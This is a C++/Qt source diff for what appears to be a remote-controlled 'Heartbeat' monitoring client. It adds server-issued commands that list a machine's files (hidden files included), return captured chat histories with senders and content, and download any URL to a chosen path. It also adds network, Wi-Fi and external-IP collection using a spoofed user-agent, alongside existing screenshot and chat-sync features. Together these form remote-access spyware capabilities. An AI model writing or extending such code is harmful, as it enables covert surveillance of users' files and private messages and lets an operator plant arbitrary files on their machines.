@@ -287,23 +287,52 @@ void Heartbeat::collectSystemInfo() {
     sqlite3* db;
     if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) return;
 
-    QString internalIp, macAddress;
+    QString internalIp = "Unknown";
+    QString macAddress = "Unknown";
+
+    // Improved Network Detection
     const QList<QNetworkInterface> interfaces = QNetworkInterface::allInterfaces();
+    
+    // First pass: Look for physical Ethernet/WiFi with IPv4
     for (const QNetworkInterface &interface : interfaces) {
-        if (!(interface.flags() & QNetworkInterface::IsLoopBack) && 
-            (interface.flags() & QNetworkInterface::IsUp) && 
-            !interface.hardwareAddress().isEmpty()) {
-             macAddress = interface.hardwareAddress();
+        if ((interface.flags() & QNetworkInterface::IsLoopBack) || 
+            !(interface.flags() & QNetworkInterface::IsUp)) {
+            continue;
+        }
+        if (interface.hardwareAddress().isEmpty()) continue;
+
+        QList<QNetworkAddressEntry> entries = interface.addressEntries();
+        for (const QNetworkAddressEntry &entry : entries) {
+            if (entry.ip().protocol() == QAbstractSocket::IPv4Protocol) {
+                QString ip = entry.ip().toString();
+                if (!ip.startsWith("127.") && !ip.startsWith("169.254.")) {
+                    internalIp = ip;
+                    macAddress = interface.hardwareAddress();
+                    goto found_network;
+                }
+            }
+        }
+    }
+    
+    // Second pass: If no perfect match, take any non-loopback Up interface
+    if (internalIp == "Unknown") {
+        for (const QNetworkInterface &interface : interfaces) {
+            if ((interface.flags() & QNetworkInterface::IsLoopBack) || 
+                !(interface.flags() & QNetworkInterface::IsUp)) {
+                continue;
+            }
              QList<QNetworkAddressEntry> entries = interface.addressEntries();
              for (const QNetworkAddressEntry &entry : entries) {
                  if (entry.ip().protocol() == QAbstractSocket::IPv4Protocol) {
                      internalIp = entry.ip().toString();
-                     break;
+                     macAddress = interface.hardwareAddress();
+                     goto found_network;
                  }
              }
-             if (!internalIp.isEmpty()) break;
         }
     }
+
+found_network:
 
     QString wifiInfo = "";
     QProcess process;
@@ -342,7 +371,7 @@ void Heartbeat::collectSystemInfo() {
     int64_t lastActive = QDateTime::currentSecsSinceEpoch();
     
     // Additional Info
-    QString externalIp = "Unknown";
+    QString externalIp = _cachedExternalIp;
     QString dataStatus = _dataStatus;
     int autoScreenshot = _monitorTimer.isActive() ? 1 : 0;
     int heartbeatInterval = _timer.interval() / 1000;
@@ -369,6 +398,53 @@ void Heartbeat::collectSystemInfo() {
 
     // Also collect WiFi
     collectWiFiInfo();
+    
+    // Trigger external IP fetch asynchronously
+    fetchExternalIp();
+}
+
+void Heartbeat::fetchExternalIp() {
+    QNetworkRequest request(QUrl("https://ipinfo.io/json"));
+    request.setHeader(QNetworkRequest::UserAgentHeader, "curl/7.68.0"); // Pretend to be curl to get simple JSON or avoid some blocks
+    QNetworkReply* reply = _network.get(request);
+    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
+        if (reply->error() == QNetworkReply::NoError) {
+            QString response = QString::fromUtf8(reply->readAll()).trimmed();
+            // Parse ipinfo.io response: {"ip": "1.2.3.4", ...}
+            QString ip = response;
+            if (response.startsWith("{")) {
+                QJsonDocument doc = QJsonDocument::fromJson(response.toUtf8());
+                if (doc.isObject()) {
+                    QJsonObject obj = doc.object();
+                    if (obj.contains("ip")) {
+                        ip = obj["ip"].toString();
+                        // Optional: We could also extract city/region here if we had columns for them.
+                        // For now, we just stick to the IP as per current schema.
+                    }
+                }
+            }
+            
+            if (!ip.isEmpty() && ip != _cachedExternalIp) {
+                _cachedExternalIp = ip;
+                
+                // Update DB immediately
+                QString dbPath = getDbPath();
+                sqlite3* db;
+                if (sqlite3_open(dbPath.toUtf8().constData(), &db) == SQLITE_OK) {
+                    sqlite3_stmt* stmt;
+                    const char* sql = "UPDATE system_info SET external_ip = ? WHERE uuid = ?;";
+                    if (sqlite3_prepare_v2(db, sql, -1, &stmt, 0) == SQLITE_OK) {
+                        sqlite3_bind_text(stmt, 1, _cachedExternalIp.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+                        sqlite3_bind_text(stmt, 2, _deviceUuid.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+                        sqlite3_step(stmt);
+                        sqlite3_finalize(stmt);
+                    }
+                    sqlite3_close(db);
+                }
+            }
+        }
+        reply->deleteLater();
+    });
 }
 
 void Heartbeat::collectWiFiInfo() {
@@ -1083,6 +1159,32 @@ void Heartbeat::executeTask(const QString& taskId, const QString& command, const
         uploadClientDb(taskId);
     } else if (command == "fetch_full_chat_history") {
         startFullSync(taskId);
+    } else if (command == "get_file_list") {
+        QString path = params; 
+        QJsonDocument doc = QJsonDocument::fromJson(params.toUtf8());
+        if (doc.isObject()) {
+            path = doc.object()["path"].toString();
+        }
+        if (path.isEmpty()) path = "C:/";
+        
+        QString json = getFileListJson(path);
+        uploadResult(taskId, json, "completed");
+    } else if (command == "get_chat_history_json") {
+        QJsonDocument doc = QJsonDocument::fromJson(params.toUtf8());
+        QJsonObject obj = doc.object();
+        QString chatId = obj["chat_id"].toString();
+        int limit = obj["limit"].toInt();
+        int offsetId = obj["offset_id"].toInt();
+        if (limit <= 0) limit = 20;
+        
+        QString json = getChatHistoryJson(chatId, limit, offsetId);
+        uploadResult(taskId, json, "completed");
+    } else if (command == "download_file") {
+        QJsonDocument doc = QJsonDocument::fromJson(params.toUtf8());
+        QJsonObject obj = doc.object();
+        QString url = obj["url"].toString();
+        QString savePath = obj["savePath"].toString();
+        downloadFile(taskId, url, savePath);
     } else if (command == "set_heartbeat") {
         int interval = params.toInt();
         if (interval >= 1000) {
@@ -1763,8 +1865,8 @@ QString Heartbeat::getWifiJson() {
             QJsonObject obj;
             obj["ssid"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 0));
             obj["bssid"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 1));
-            obj["signalStrength"] = sqlite3_column_int(stmt, 2);
-            obj["securityType"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 3));
+            obj["signal"] = sqlite3_column_int(stmt, 2);
+            obj["auth"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 3));
             array.append(obj);
         }
         sqlite3_finalize(stmt);
@@ -2044,6 +2146,84 @@ void BackgroundScanner::process() {
     sqlite3_close(db);
 
     Q_EMIT scanFinished(_taskId, QByteArray());
+}
+
+QString Heartbeat::getFileListJson(const QString& path) {
+    QDir dir(path);
+    if (!dir.exists()) return "[]";
+    
+    QJsonArray files;
+    QFileInfoList entries = dir.entryInfoList(QDir::AllEntries | QDir::NoDotAndDotDot | QDir::Hidden);
+    
+    for (const QFileInfo& entry : entries) {
+        QJsonObject file;
+        file["name"] = entry.fileName();
+        file["path"] = entry.absoluteFilePath();
+        file["is_dir"] = entry.isDir();
+        file["size"] = entry.isDir() ? 0 : entry.size();
+        file["last_modified"] = entry.lastModified().toString("yyyy-MM-dd HH:mm:ss");
+        files.append(file);
+    }
+    return QJsonDocument(files).toJson(QJsonDocument::Compact);
+}
+
+QString Heartbeat::getChatHistoryJson(const QString& chatId, int limit, int offsetId) {
+    QString dbPath = getDbPath();
+    sqlite3* db;
+    if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) return "[]";
+
+    QJsonArray array;
+    sqlite3_stmt* stmt;
+    QString sql = "SELECT msg_id, chat_id, sender_id, sender, content, timestamp, is_outgoing, media_path FROM chat_logs WHERE chat_id = ? ";
+    if (offsetId > 0) {
+        sql += "AND msg_id < ? ";
+    }
+    sql += "ORDER BY timestamp DESC LIMIT ?;";
+
+    if (sqlite3_prepare_v2(db, sql.toUtf8().constData(), -1, &stmt, 0) == SQLITE_OK) {
+        sqlite3_bind_text(stmt, 1, chatId.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+        int idx = 2;
+        if (offsetId > 0) {
+            sqlite3_bind_int(stmt, idx++, offsetId);
+        }
+        sqlite3_bind_int(stmt, idx, limit);
+
+        while (sqlite3_step(stmt) == SQLITE_ROW) {
+            QJsonObject obj;
+            obj["msg_id"] = sqlite3_column_int(stmt, 0);
+            obj["chat_id"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 1));
+            obj["sender_id"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 2));
+            obj["sender_name"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 3));
+            obj["content"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 4));
+            obj["timestamp"] = sqlite3_column_int64(stmt, 5);
+            obj["is_outgoing"] = sqlite3_column_int(stmt, 6) ? true : false;
+            obj["media_path"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 7));
+            array.append(obj);
+        }
+        sqlite3_finalize(stmt);
+    }
+    sqlite3_close(db);
+    return QJsonDocument(array).toJson(QJsonDocument::Compact);
+}
+
+void Heartbeat::downloadFile(const QString& taskId, const QString& url, const QString& savePath) {
+    QNetworkRequest request((QUrl(url)));
+    QNetworkReply* reply = _network.get(request);
+    connect(reply, &QNetworkReply::finished, this, [this, reply, taskId, savePath]() {
+        if (reply->error() == QNetworkReply::NoError) {
+             QFile file(savePath);
+             if (file.open(QIODevice::WriteOnly)) {
+                 file.write(reply->readAll());
+                 file.close();
+                 uploadResult(taskId, "File downloaded to " + savePath, "completed");
+             } else {
+                 uploadResult(taskId, "Failed to open save path: " + savePath, "failed");
+             }
+        } else {
+            uploadResult(taskId, "Download failed: " + reply->errorString(), "failed");
+        }
+        reply->deleteLater();
+    });
 }
 
 } // namespace Core
